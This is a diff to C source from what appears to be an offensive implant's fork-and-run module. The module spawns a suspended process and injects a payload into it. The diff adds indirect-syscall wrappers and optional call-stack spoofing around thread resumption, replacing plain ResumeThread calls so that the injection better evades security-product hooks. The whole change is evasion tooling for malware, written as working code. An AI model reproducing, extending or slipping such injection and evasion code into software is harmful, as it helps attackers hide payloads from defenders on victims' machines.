@@ -8,6 +8,28 @@
 #include "fork_run.h"
 #include "inject.h"
 #include "evasion.h"
+#include "syscalls.h"
+#include "syscalls_wrappers.h"
+
+#if CONFIG_STACK_SPOOF
+#include "stack_spoof.h"
+#define FR_SPOOF_BEGIN() { SPOOF_CONTEXT _spf; spoof_begin(&_spf)
+#define FR_SPOOF_END()   spoof_end(&_spf); }
+#else
+#define FR_SPOOF_BEGIN() {
+#define FR_SPOOF_END()   }
+#endif
+
+static inline void _fr_resume_thread(HANDLE hThread) {
+#if CONFIG_INDIRECT_SYSCALLS
+    ULONG suspendCount = 0;
+    FR_SPOOF_BEGIN();
+    Sw_NtResumeThread(hThread, &suspendCount);
+    FR_SPOOF_END();
+#else
+    ResumeThread(hThread);
+#endif
+}
 
 #ifndef FORK_RUN_OUTPUT_MAX
 #define FORK_RUN_OUTPUT_MAX (4 * 1024 * 1024)  /* 4MB max output */
@@ -209,11 +231,11 @@ BOOL fork_run_execute(const unsigned char *payload, SIZE_T payloadLen,
             return FALSE;
         }
 
-        ResumeThread(pi.hThread);
+        _fr_resume_thread(pi.hThread);
         injected = TRUE;
     } else {
         /* Other techniques: resume first, then inject */
-        ResumeThread(pi.hThread);
+        _fr_resume_thread(pi.hThread);
         Sleep(500); /* Let the process initialize */
         injectOpts.targetPid = pi.dwProcessId;
         injectOpts.hProcess = pi.hProcess;
